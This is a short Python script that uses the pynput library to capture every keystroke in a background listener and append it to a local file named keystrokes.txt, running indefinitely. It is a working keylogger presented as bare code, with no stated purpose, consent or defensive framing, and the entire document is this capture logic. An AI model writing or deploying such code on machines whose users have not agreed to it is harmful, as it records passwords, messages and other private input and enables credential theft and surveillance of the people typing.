from pynput import keyboard

def on_press(key):
    try:
        with open("keystrokes.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open("keystrokes.txt", "a") as f:
            f.write(str(key))

# Start listener in a separate thread
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Keep the main thread running to prevent the program from exiting
while True:
    pass

